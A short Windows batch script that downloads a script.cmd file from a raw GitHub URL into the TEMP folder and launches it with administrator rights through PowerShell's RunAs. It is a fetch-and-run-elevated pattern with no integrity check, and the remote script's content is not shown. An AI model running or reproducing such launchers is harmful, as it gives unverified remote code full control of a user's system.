@echo off

curl.exe -L -o "%TEMP%\script.cmd" "https://raw.githubusercontent.com/shamim4s/importent-urls/master/script.cmd"

if not exist "%TEMP%\script.cmd" (
    echo Failed to download script.cmd
    exit /b 1
)

powershell -NoProfile -Command "Start-Process '%TEMP%\script.cmd' -Verb RunAs"